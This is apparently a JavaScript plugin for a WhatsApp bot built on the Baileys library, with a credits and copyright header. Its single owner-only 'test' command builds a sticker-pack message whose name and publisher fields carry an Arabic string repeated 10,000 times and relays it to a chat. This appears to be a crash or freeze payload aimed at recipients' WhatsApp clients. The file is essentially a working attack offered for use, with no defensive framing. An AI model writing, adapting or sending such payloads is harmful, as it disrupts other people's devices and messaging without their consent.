/**

* Hirara AI — WhatsApp Bot
* 
* Library      : @wishkeysocket/baileys
* Type         : Plugins | ESM Modules
* Creator      : Mommy Kyu
* Recode       : (Your Name)
* 
* Official Channels:
* • https://whatsapp.com/channel/0029VbDO8tI2phHLTSN2ed0U
* • https://whatsapp.com/channel/0029VbCKm3I5EjxsUbvmVf33
* 
* Thanks To:
* • Allah SWT. — The Creator of Everything
* • Mother & Father — My Greatest Support
* • Kyu — Developer of Hirara AI
* • Hilman — Developer of Ryo Yamada MD
* • Kano — femboy jing
* • Rennz — pemboy nya akuu
* • Raynold — penyopng Ourin jir 😹
* • Fahri — Developer of Jssslyn MD
* • Amane Offc — orng belok
* • All Buyers
* • All Users & Contributors
* 
* Documentation:
* [ID]  Baca README.md untuk melihat panduan.
* [EN]  Read README.md untuk melihat panduan.
* 
* Distribution Notice:
* Dilarang menyebarkan source code ini secara gratis
* tanpa izin dari creator.
* 
* Pelanggaran terhadap ketentuan ini dapat menyebabkan
* penghentian update dan dukungan terhadap source code.
* 
* Copyright © Mommy Kyu 2026
* All Rights Reserved.
  */

import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const handler = async (m, { conn, sock, usedPrefix, command, Func }) => {
	const client = sock || conn || global.mainSock || global.conn;

	await client.sendMessage(m.chat, { react: { text: '💀', key: m.key } }).catch(() => {});

	try {
		const repeatString = 'نٽن'.repeat(10000);

		const msg = generateWAMessageFromContent(
			m.chat,
			{
				stickerPackMessage: {
					stickerPackId: '7b1760a6-472d-41b5-bbf5-e724c7de8604',
					name: 'ᴋʏᴜᴜ-sɪɢᴍᴀ' + repeatString,
					publisher: 'sʜɪᴢᴜᴋᴜ-ᴀɪ' + repeatString,
					stickers: [
						{
							fileName: 'iLkMr4xDw8I8jV2E02tx9KMtnUZsu18ClZ4JvkvKHd0=.webp',
							isAnimated: false,
							accessibilityLabel: '',
							isLottie: false,
							mimetype: 'image/webp'
						}
					],
					fileLength: '89684',
					fileSha256: Buffer.from('51VJsrdwSn9fwRckyTfsZIdnrAjZ9vIVgoenEJ0nv6k=', 'base64'),
					fileEncSha256: Buffer.from('UZDYZd1kJ6mREbgDAdfpqgjNmpSHtayTwvkH+4Yrn80=', 'base64'),
					mediaKey: Buffer.from('29ga9NVhHX1LWul9OWo7K+ROdGgFvXIQTrw3RmUMS64=', 'base64'),
					directPath: '/v/t62.15575-24/652905003_1418493843085030_5816252767151869696_n.enc?ccb=11-4',
					contextInfo: {},
					mediaKeyTimestamp: '1773502297',
					trayIconFileName: '7b1760a6-472d-41b5-bbf5-e724c7de8604.png',
					stickerPackSize: '89308',
					stickerPackOrigin: 'USER_CREATED'
				}
			},
			{}
		);

		await client.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
	} catch (e) {
		console.error('[TEST STC ERROR]:', e);
		const errText = `> ❌ ᴇʀʀᴏʀ : ${e.message}`;
		await client.sendMessage(m.chat, { text: Func?.Styles ? Func.Styles(errText) : errText }, { quoted: m }).catch(() => {});
	}
};

handler.help = ['test'];
handler.tags = ['owner'];
handler.command = /^(test)$/i;
handler.owner = true;

export default handler;
